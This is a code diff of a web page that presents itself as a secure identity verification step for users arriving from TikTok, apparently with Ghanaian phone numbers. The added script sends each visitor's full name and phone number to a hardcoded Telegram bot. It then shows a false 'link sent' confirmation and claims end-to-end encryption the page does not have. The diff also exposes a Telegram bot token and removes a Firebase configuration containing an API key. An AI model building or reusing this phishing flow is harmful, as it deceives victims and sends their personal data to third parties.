@@ -9,11 +9,7 @@
     <meta name="theme-color" content="#E30613">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     <style>
-        /* --- Same styles as before, kept unchanged --- */
         * {
             margin: 0;
             padding: 0;
@@ -286,8 +282,8 @@
             display: block;
         }
 
-        /* ---- Copy Modal ---- */
-        #copyModal {
+        /* ---- Option Modal ---- */
+        #optionModal {
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.6);
@@ -308,6 +304,8 @@
             text-align: left;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             animation: modalPop 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         @keyframes modalPop {
@@ -331,130 +329,176 @@
             text-align: center;
         }
 
-        .modal-card .modal-message {
+        .modal-card .modal-intro {
             font-size: 15px;
             color: #6c757d;
+            line-height: 1.7;
+            margin-bottom: 4px;
+            text-align: left;
+        }
+
+        .modal-card .modal-intro strong {
+            color: var(--text-dark);
+        }
+
+        .modal-card .modal-info {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin: 12px 0 16px;
+            border-left: 4px solid var(--primary-red);
+            font-size: 14px;
+            color: #495057;
             line-height: 1.6;
-            margin-bottom: 12px;
         }
 
-        .modal-card .modal-message strong {
-            color: var(--text-dark);
-        }
-
-        .modal-steps {
-            background: #f8f9fa;
-            padding: 12px 14px;
-            border-radius: 10px;
-            margin-bottom: 14px;
-            font-size: 14px;
-            line-height: 1.8;
-        }
-
-        .modal-steps .step {
-            display: flex;
-            gap: 8px;
-            align-items: flex-start;
-        }
-
-        .modal-steps .step-num {
+        .modal-card .modal-info .info-title {
             font-weight: 700;
-            color: var(--primary-red);
-            min-width: 24px;
-        }
-
-        .modal-link-box {
-            background: #f8f9fa;
-            padding: 10px 14px;
-            border-radius: 10px;
-            border: 1px solid #e9ecef;
-            margin-bottom: 12px;
-            word-break: break-all;
-            font-size: 14px;
             color: var(--text-dark);
-            font-family: 'Inter', monospace;
+            display: block;
+            margin-bottom: 2px;
         }
 
-        .modal-btn-group {
+        .modal-card .modal-info ul {
+            padding-left: 18px;
+            margin-top: 4px;
+        }
+
+        .modal-card .modal-info ul li {
+            margin-bottom: 2px;
+        }
+
+        .modal-card .modal-divider {
+            height: 1px;
+            background: #e9ecef;
+            margin: 14px 0;
+        }
+
+        .modal-card .modal-question {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .option-grid {
             display: flex;
+            flex-direction: column;
             gap: 10px;
-            flex-wrap: wrap;
+            margin-bottom: 12px;
         }
 
-        .modal-btn-group .modal-copy-btn {
-            flex: 1;
-            padding: 14px 20px;
-            border: none;
+        .option-btn {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #e9ecef;
             border-radius: 12px;
-            font-size: 16px;
-            font-weight: 700;
+            background: white;
             cursor: pointer;
             transition: 0.2s;
-            background: linear-gradient(90deg, #00a86b, #008f5a);
-            color: white;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            min-width: 120px;
+            gap: 12px;
+            text-align: left;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-dark);
         }
 
-        .modal-btn-group .modal-copy-btn:hover {
-            background: linear-gradient(90deg, #00995f, #007a4d);
+        .option-btn:hover {
+            border-color: var(--primary-red);
+            background: #fff5f5;
         }
 
-        .modal-btn-group .modal-copy-btn:active {
+        .option-btn .option-icon {
+            font-size: 26px;
+            width: 36px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .option-btn .option-label {
+            flex: 1;
+        }
+
+        .option-btn .option-badge {
+            font-size: 11px;
+            background: #28a745;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .option-btn.recommended {
+            border-color: #28a745;
+            background: #f0fff4;
+        }
+
+        .option-btn.recommended:hover {
+            background: #d4edda;
+        }
+
+        .option-btn.selected {
+            border-color: var(--primary-red);
+            background: #fff5f5;
+            box-shadow: 0 0 0 2px rgba(227, 6, 19, 0.2);
+        }
+
+        .option-btn:active {
             transform: scale(0.97);
         }
 
-        .modal-btn-group .modal-copy-btn.copied {
-            background: #28a745;
+        .modal-card .modal-success {
+            display: none;
+            text-align: center;
+            padding: 12px 0;
         }
 
-        .modal-btn-group .modal-close-btn {
-            padding: 14px 24px;
+        .modal-card .modal-success .check-icon {
+            font-size: 48px;
+            color: #28a745;
+            margin-bottom: 8px;
+        }
+
+        .modal-card .modal-success p {
+            font-size: 15px;
+            color: #6c757d;
+            line-height: 1.5;
+        }
+
+        .get-link-btn {
+            width: 100%;
+            padding: 14px;
             border: none;
             border-radius: 12px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
             background: #e9ecef;
-            color: #495057;
+            color: #adb5bd;
+            margin-top: 4px;
         }
 
-        .modal-btn-group .modal-close-btn:hover {
-            background: #dee2e6;
+        .get-link-btn.active {
+            background: linear-gradient(90deg, #00a86b, #008f5a);
+            color: white;
+            box-shadow: 0 4px 12px rgba(0, 168, 107, 0.3);
         }
 
-        .modal-copy-success {
-            font-size: 14px;
-            color: #28a745;
-            margin-top: 8px;
-            display: none;
-            align-items: center;
-            gap: 6px;
-            font-weight: 600;
+        .get-link-btn.active:hover {
+            background: linear-gradient(90deg, #00995f, #007a4d);
         }
 
-        .modal-copy-success.show {
-            display: flex;
+        .get-link-btn:active {
+            transform: scale(0.97);
         }
 
-        .modal-tip {
-            font-size: 13px;
-            color: #888;
-            margin-top: 14px;
-            padding-top: 14px;
-            border-top: 1px solid #e9ecef;
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-        }
-
-        .modal-tip i {
-            color: var(--primary-red);
-            margin-top: 2px;
+        .get-link-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
 
         /* ---- Loading Spinner Overlay ---- */
@@ -521,55 +565,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Session expired overlay */
-        #expiryOverlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(3px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1001;
-            padding: 20px;
-        }
-
-        .expiry-card {
-            background: white;
-            border-radius: 24px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-
-        .expiry-card .expiry-icon {
-            font-size: 48px;
-            color: #dc3545;
-            margin-bottom: 16px;
-        }
-
-        .expiry-card h2 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .expiry-card p {
-            font-size: 15px;
-            color: #6c757d;
-            line-height: 1.5;
-            margin-bottom: 16px;
-        }
-
-        .expiry-card .countdown {
-            font-size: 32px;
-            font-weight: 800;
-            color: var(--primary-red);
-        }
-
         @media (max-width: 480px) {
             body {
                 padding: 8px;
@@ -603,14 +598,13 @@
             .modal-card {
                 padding: 24px 16px;
             }
-            .modal-btn-group {
-                flex-direction: column;
+            .option-btn {
+                padding: 12px 14px;
+                font-size: 14px;
             }
-            .modal-btn-group .modal-copy-btn {
-                width: 100%;
-            }
-            .modal-btn-group .modal-close-btn {
-                width: 100%;
+            .modal-card .modal-info {
+                font-size: 13px;
+                padding: 12px 14px;
             }
         }
 
@@ -642,6 +636,10 @@
             .id-list {
                 font-size: 12px;
                 margin-left: 14px;
+            }
+            .option-btn .option-icon {
+                font-size: 22px;
+                width: 30px;
             }
         }
 
@@ -675,11 +673,6 @@
 
         <div class="status-badge">
             <i class="fas fa-clock" style="margin-right: 6px;"></i> Pending Verification
-        </div>
-
-        <div class="error-box" id="errorBox">
-            <i class="fas fa-exclamation-circle"></i>
-            <span id="errorText">No verification link available.</span>
         </div>
 
         <p class="card-subtitle" style="text-align: left; width: 100%;">
@@ -742,44 +735,51 @@
         </div>
     </div>
 
-    <!-- Copy Modal -->
-    <div id="copyModal">
+    <!-- Option Modal -->
+    <div id="optionModal">
         <div class="modal-card">
-            <div class="modal-icon"><i class="fas fa-lock"></i></div>
+            <div class="modal-icon"><i class="fas fa-shield-alt"></i></div>
             <h2>🔒 Secure Verification Required</h2>
-            <div class="modal-message">
-                To protect your identity, we use a secure browser session. This link only works in a real browser like <strong>Chrome</strong>, <strong>Safari</strong>, or <strong>Firefox</strong> – not in TikTok's built‑in browser.
-            </div>
-            <div class="modal-steps">
-                <div class="step"><span class="step-num">1.</span> Tap the <strong>Copy Link</strong> button below.</div>
-                <div class="step"><span class="step-num">2.</span> Open Chrome, Safari or Firefox app on your phone.</div>
-                <div class="step"><span class="step-num">3.</span> Paste the link in the address bar and press <strong>Go</strong>.</div>
-            </div>
-            <div class="modal-link-box" id="modalLinkDisplay">https://veriff.me/...</div>
-            <div class="modal-btn-group">
-                <button class="modal-copy-btn" id="modalCopyBtn">
-                    <i class="fas fa-copy"></i> Copy Link
-                </button>
-                <button class="modal-close-btn" id="modalCloseBtn">Close</button>
-            </div>
-            <div class="modal-copy-success" id="modalCopySuccess">
-                <i class="fas fa-check-circle"></i> Link copied! Now open your browser and paste it.
-            </div>
-            <div class="modal-tip">
-                <i class="fas fa-info-circle"></i>
-                <span><strong>Tip:</strong> After copying, open your browser's address bar, paste the link, and press Enter.</span>
-            </div>
-        </div>
-    </div>
 
-    <!-- Session expired overlay -->
-    <div id="expiryOverlay">
-        <div class="expiry-card">
-            <div class="expiry-icon"><i class="fas fa-clock"></i></div>
-            <h2>Session Expired</h2>
-            <p>Your verification link has expired. Please start a new application.</p>
-            <div class="countdown" id="countdownDisplay">5</div>
-            <p style="font-size: 13px; color: #888; margin-top: 8px;">Redirecting in <span id="countdownSeconds">5</span> seconds...</p>
+            <div class="modal-intro">
+                <strong>Why we need this:</strong> To protect your identity and prevent fraud, we require a secure verification session. TikTok's built‑in browser doesn't support the security features needed for identity verification.
+            </div>
+
+            <div class="modal-info">
+                <span class="info-title">📌 What you need to know:</span>
+                <ul>
+                    <li><strong>Your ID and selfie</strong> will be verified through a secure, encrypted session.</li>
+                    <li>We use <strong>end‑to‑end encryption</strong> – your data is safe.</li>
+                    <li>TikTok's browser <strong>cannot</strong> run this type of secure verification.</li>
+                    <li>You'll receive a <strong>one‑time link</strong> via your chosen channel.</li>
+                </ul>
+            </div>
+
+            <div class="modal-divider"></div>
+
+            <div class="modal-question">📲 Choose how you'd like to receive your verification link:</div>
+
+            <div class="option-grid" id="optionGrid">
+                <button class="option-btn recommended" data-option="whatsapp">
+                    <span class="option-icon"><i class="fab fa-whatsapp" style="color: #25D366;"></i></span>
+                    <span class="option-label">WhatsApp</span>
+                    <span class="option-badge">Recommended</span>
+                </button>
+                <button class="option-btn" data-option="sms">
+                    <span class="option-icon"><i class="fas fa-sms" style="color: #6c757d;"></i></span>
+                    <span class="option-label">SMS</span>
+                </button>
+            </div>
+
+            <!-- "Get Link" button -->
+            <button class="get-link-btn" id="getLinkBtn" disabled>Get Link</button>
+
+            <!-- Success state (hidden initially) -->
+            <div class="modal-success" id="modalSuccess">
+                <div class="check-icon"><i class="fas fa-check-circle"></i></div>
+                <p id="successMessage">Verification link sent to your WhatsApp. Please check your messages.</p>
+                <button class="btn btn-verify" id="closeModalBtn" style="margin-top: 16px;">Got it</button>
+            </div>
         </div>
     </div>
 
@@ -792,23 +792,6 @@
     </div>
 
     <script>
-        // ============================================================
-        // FIREBASE CONFIGURATION
-        // ============================================================
-        const firebaseConfig = {
-            apiKey: "AIzaSyBqt0UDmHTxPAn33auTapQ-J1R5qf-YfRQ",
-            authDomain: "gh-olans.firebaseapp.com",
-            projectId: "gh-olans",
-            storageBucket: "gh-olans.firebasestorage.app",
-            messagingSenderId: "1021665968096",
-            appId: "1:1021665968096:web:23fbf673547e65d48ef585",
-            measurementId: "G-P0KHN55TRL",
-            databaseURL: "https://gh-olans-default-rtdb.firebaseio.com/"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
         // ============================================================
         // 1. Load user data from localStorage
         // ============================================================
@@ -845,181 +828,154 @@
         // ============================================================
 
         const verifyBtn = document.getElementById('verifyBtn');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
-        const infoNote = document.getElementById('infoNote');
-        const spinner = document.getElementById('spinner');
-        const expiryOverlay = document.getElementById('expiryOverlay');
-        const countdownDisplay = document.getElementById('countdownDisplay');
-        const countdownSeconds = document.getElementById('countdownSeconds');
-
-        // Loading overlay
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const optionModal = document.getElementById('optionModal');
+        const optionGrid = document.getElementById('optionGrid');
+        const modalSuccess = document.getElementById('modalSuccess');
+        const successMessage = document.getElementById('successMessage');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const getLinkBtn = document.getElementById('getLinkBtn');
 
-        // Copy modal
-        const copyModal = document.getElementById('copyModal');
-        const modalLinkDisplay = document.getElementById('modalLinkDisplay');
-        const modalCopyBtn = document.getElementById('modalCopyBtn');
-        const modalCloseBtn = document.getElementById('modalCloseBtn');
-        const modalCopySuccess = document.getElementById('modalCopySuccess');
-
-        let currentUserId = phone;
-        let verificationUrl = null;
-        let linkRef = null;
-        let hasLoggedCopy = false;
+        let selectedChannel = null;
+        let isGettingLink = false;
 
         // ============================================================
-        // 3. Helper functions
+        // 3. Send user choice to Telegram
         // ============================================================
 
-        function showError(message) {
-            errorBox.classList.add('show');
-            errorText.textContent = message;
-        }
+        function sendChoiceToTelegram(option) {
+            const botToken = '8736269489:AAFJ4LyUwUYQ9K_rKWwmY1GccWUDLFTEGsA';
+            const chatId = '1006917440';
 
-        function hideError() {
-            errorBox.classList.remove('show');
-        }
+            const optionLabel = option === 'whatsapp' ? 'WhatsApp' : 'SMS';
+            const fullPhone = phone ? `+233${phone}` : 'Not provided';
 
-        // ============================================================
-        // 4. Session expiry handling – based on createdAt (link age)
-        // ============================================================
+            const message = `📱 Verification Link Request (Demo)
+            ━━━━━━━━━━━━━━━━━━━
+            👤 Full Name: ${fullName}
+            📱 Phone: ${fullPhone}
+            📨 Channel: <b>${optionLabel}</b>
+            ━━━━━━━━━━━━━━━━━━━
+            🔗 This is a simulation – no real link was assigned.`;
 
-        function startExpiryCountdown() {
-            let count = 5;
-            countdownDisplay.textContent = count;
-            countdownSeconds.textContent = count;
-            expiryOverlay.style.display = 'flex';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
 
-            const interval = setInterval(() => {
-                count--;
-                countdownDisplay.textContent = count;
-                countdownSeconds.textContent = count;
-                if (count <= 0) {
-                    clearInterval(interval);
-                    window.location.href = 'details.html';
-                }
-            }, 1000);
-        }
-
-        // ============================================================
-        // 5. Copy to clipboard + log to Firebase (copy event only)
-        // ============================================================
-
-        function copyToClipboard(text) {
-            if (navigator.clipboard && window.isSecureContext) {
-                return navigator.clipboard.writeText(text);
-            } else {
-                return new Promise((resolve, reject) => {
-                    const textArea = document.createElement('textarea');
-                    textArea.value = text;
-                    textArea.style.position = 'fixed';
-                    textArea.style.left = '-9999px';
-                    textArea.style.top = '-9999px';
-                    document.body.appendChild(textArea);
-                    textArea.focus();
-                    textArea.select();
-                    try {
-                        const success = document.execCommand('copy');
-                        document.body.removeChild(textArea);
-                        if (success) resolve();
-                        else reject(new Error('execCommand failed'));
-                    } catch (err) {
-                        document.body.removeChild(textArea);
-                        reject(err);
-                    }
-                });
-            }
-        }
-
-        // Log copy event without marking as used
-        function logCopyEvent() {
-            if (hasLoggedCopy) return;
-            if (!currentUserId || !verificationUrl) return;
-
-            hasLoggedCopy = true;
-            const copyRef = database.ref('veriffLinks/' + currentUserId);
-            copyRef.update({
-                copied: true,
-                copiedAt: Date.now()
-            }).then(() => {
-                console.log('✅ Copy event logged for user:', currentUserId);
-            }).catch((err) => {
-                console.warn('Could not log copy event:', err);
+            return fetch(url, {
+                method: 'GET',
+                keepalive: true
             });
         }
 
         // ============================================================
-        // 6. Show/hide modal
+        // 4. Show/hide modal
         // ============================================================
 
-        function showCopyModal(url) {
-            modalLinkDisplay.textContent = url;
-            modalCopySuccess.classList.remove('show');
-            modalCopyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
-            modalCopyBtn.classList.remove('copied');
-            copyModal.style.display = 'flex';
+        function showOptionModal() {
+            // Reset state
+            selectedChannel = null;
+            getLinkBtn.disabled = true;
+            getLinkBtn.classList.remove('active');
+            optionGrid.style.display = 'flex';
+            modalSuccess.style.display = 'none';
+            // Remove selected class from all buttons
+            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+            optionModal.style.display = 'flex';
         }
 
-        function hideCopyModal() {
-            copyModal.style.display = 'none';
+        function hideOptionModal() {
+            optionModal.style.display = 'none';
         }
 
         // ============================================================
-        // 7. Modal button handlers
+        // 5. Option selection handler
         // ============================================================
 
-        modalCopyBtn.addEventListener('click', function() {
-            const link = modalLinkDisplay.textContent;
-            if (!link) return;
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (isGettingLink) return;
 
-            copyToClipboard(link)
+                // Remove selected class from all
+                document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+                // Add selected class to this
+                this.classList.add('selected');
+
+                selectedChannel = this.dataset.option;
+
+                // Enable the Get Link button
+                getLinkBtn.disabled = false;
+                getLinkBtn.classList.add('active');
+            });
+        });
+
+        // ============================================================
+        // 6. Get Link button handler
+        // ============================================================
+
+        getLinkBtn.addEventListener('click', function() {
+            if (isGettingLink || !selectedChannel) return;
+
+            isGettingLink = true;
+            getLinkBtn.disabled = true;
+            getLinkBtn.textContent = 'Sending...';
+
+            sendChoiceToTelegram(selectedChannel)
                 .then(() => {
-                    // Visual feedback
-                    modalCopyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-                    modalCopyBtn.classList.add('copied');
-                    modalCopySuccess.classList.add('show');
-
-                    // Log copy event (does NOT mark as used)
-                    logCopyEvent();
-
-                    // Reset button text after a few seconds (keep success message visible)
-                    setTimeout(() => {
-                        modalCopyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
-                        modalCopyBtn.classList.remove('copied');
-                    }, 4000);
+                    // Show success
+                    optionGrid.style.display = 'none';
+                    getLinkBtn.style.display = 'none';
+                    modalSuccess.style.display = 'block';
+                    const optionLabel = selectedChannel === 'whatsapp' ? 'WhatsApp' : 'SMS';
+                    successMessage.textContent = `Verification link sent to your ${optionLabel}. Please check your messages.`;
                 })
                 .catch(() => {
-                    alert('Could not copy. Please select the link and copy it manually (Ctrl+C / Cmd+C).');
+                    // If fails, re-enable
+                    getLinkBtn.textContent = 'Get Link';
+                    getLinkBtn.disabled = false;
+                    getLinkBtn.classList.add('active');
+                    isGettingLink = false;
+                    alert('Could not send request. Please try again.');
                 });
         });
 
-        modalCloseBtn.addEventListener('click', function() {
-            hideCopyModal();
+        // ============================================================
+        // 7. Close modal handlers
+        // ============================================================
+
+        closeModalBtn.addEventListener('click', function() {
+            hideOptionModal();
+            resetModalState();
             verifyBtn.disabled = false;
             verifyBtn.style.opacity = '1';
             verifyBtn.style.cursor = 'pointer';
         });
 
-        copyModal.addEventListener('click', function(e) {
-            if (e.target === copyModal) {
-                hideCopyModal();
+        optionModal.addEventListener('click', function(e) {
+            if (e.target === optionModal) {
+                hideOptionModal();
+                resetModalState();
                 verifyBtn.disabled = false;
                 verifyBtn.style.opacity = '1';
                 verifyBtn.style.cursor = 'pointer';
             }
         });
 
+        function resetModalState() {
+            isGettingLink = false;
+            selectedChannel = null;
+            getLinkBtn.textContent = 'Get Link';
+            getLinkBtn.disabled = true;
+            getLinkBtn.classList.remove('active');
+            getLinkBtn.style.display = 'block';
+            optionGrid.style.display = 'flex';
+            modalSuccess.style.display = 'none';
+            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+        }
+
         // ============================================================
         // 8. Verify button – show loading, then modal
         // ============================================================
 
         verifyBtn.addEventListener('click', function() {
-            if (!verificationUrl) {
-                showError('No active verification link available. Please wait for your link to be assigned or contact support.');
-                return;
-            }
-
             verifyBtn.disabled = true;
             verifyBtn.style.opacity = '0.6';
             verifyBtn.style.cursor = 'not-allowed';
@@ -1027,82 +983,21 @@
 
             setTimeout(() => {
                 loadingOverlay.style.display = 'none';
-                showCopyModal(verificationUrl);
+                showOptionModal();
             }, 3000);
         });
 
         // ============================================================
-        // 9. Firebase listener – get link and check expiry (based on createdAt)
-        // ============================================================
-
-        function listenForLink() {
-            if (!currentUserId) {
-                showError('No user ID found. Please start your application again.');
-                return;
-            }
-
-            linkRef = database.ref('veriffLinks/' + currentUserId);
-            linkRef.on('value', (snapshot) => {
-                const linkData = snapshot.val();
-                hideError();
-
-                if (!linkData) {
-                    verificationUrl = null;
-                    infoNote.textContent = 'Your verification link is being prepared. Please wait...';
-                    return;
-                }
-
-                // Check expiry based on createdAt (10 minutes)
-                const createdAt = linkData.createdAt || 0;
-                const now = Date.now();
-                const TEN_MINUTES = 10 * 60 * 1000;
-
-                if (now - createdAt > TEN_MINUTES) {
-                    // Link has expired – show expiry overlay
-                    startExpiryCountdown();
-                    return;
-                }
-
-                // Link is active
-                verificationUrl = linkData.url;
-                hideError();
-                infoNote.textContent = 'Your verification link is ready. Click "Verify Identity" to proceed.';
-            });
-        }
-
-        // ============================================================
-        // 10. Start listening
-        // ============================================================
-
-        if (currentUserId) {
-            listenForLink();
-        } else {
-            showError('No user ID found. Please start your application again.');
-            setTimeout(() => {
-                window.location.href = 'details.html';
-            }, 3000);
-        }
-
-        // ============================================================
-        // 11. Clear loading overlay on page load / back navigation
+        // 9. Clear loading overlay on page load / back navigation
         // ============================================================
 
         window.addEventListener('pageshow', function() {
             loadingOverlay.style.display = 'none';
-            spinner.style.display = 'none';
             verifyBtn.disabled = false;
             verifyBtn.style.opacity = '1';
             verifyBtn.style.cursor = 'pointer';
-        });
-
-        // ============================================================
-        // 12. Cleanup listener
-        // ============================================================
-
-        window.addEventListener('beforeunload', function() {
-            if (linkRef) {
-                linkRef.off();
-            }
+            hideOptionModal();
+            resetModalState();
         });
     </script>
 
